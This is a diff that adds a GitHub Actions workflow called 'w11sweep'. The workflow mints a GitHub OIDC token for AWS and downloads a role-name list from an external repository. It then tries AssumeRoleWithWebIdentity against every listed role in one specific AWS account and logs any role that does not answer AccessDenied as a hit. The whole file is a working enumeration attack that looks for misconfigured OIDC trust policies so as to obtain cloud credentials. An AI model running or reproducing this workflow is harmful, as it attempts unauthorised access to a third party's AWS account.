@@ -1,0 +1,44 @@
+name: w11sweep
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  sweep:
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    steps:
+      - name: mint and sweep
+        run: |
+          set -euo pipefail
+          TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          echo "$TOKEN" > /tmp/t.jwt
+          curl -sS -o /tmp/roles.txt https://raw.githubusercontent.com/owl-king/arm-oeth/main/roles_all.txt
+          wc -l /tmp/roles.txt
+          python3 - <<'PY'
+          import urllib.parse, urllib.request, urllib.error, time, re, collections
+          t=open('/tmp/t.jwt').read().strip()
+          names=[l.strip() for l in open('/tmp/roles.txt') if l.strip()]
+          names=list(dict.fromkeys(names))
+          print('unique',len(names))
+          cnt=collections.Counter(); hits=[]
+          def sts(name):
+              arn=f'arn:aws:iam::220898748818:role/{name}'
+              data=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':arn,'RoleSessionName':'w11sweep','DurationSeconds':'3600','WebIdentityToken':t}).encode()
+              req=urllib.request.Request('https://sts.amazonaws.com/',data=data,method='POST',headers={'Content-Type':'application/x-www-form-urlencoded','User-Agent':'w11sweep'})
+              try:
+                  with urllib.request.urlopen(req,timeout=10) as r: body=r.read().decode('utf-8','replace'); code=r.status
+              except urllib.error.HTTPError as e: body=e.read().decode('utf-8','replace'); code=e.code
+              m=re.search(r'<Code>([^<]+)</Code>',body); ec=m.group(1) if m else '-'
+              cnt[(code,ec)]+=1
+              if code!=403 or ec!='AccessDenied':
+                  hits.append((name,code,ec)); print('HIT|',name,code,ec,body[:300].replace('\n',' '))
+          for i,n in enumerate(names):
+              sts(n)
+              if i%100==0: print('PROGRESS',i)
+              time.sleep(0.3)
+          print('COUNTER',dict(cnt))
+          print('HITS',hits)
+          print('DONE',len(names))
+          PY
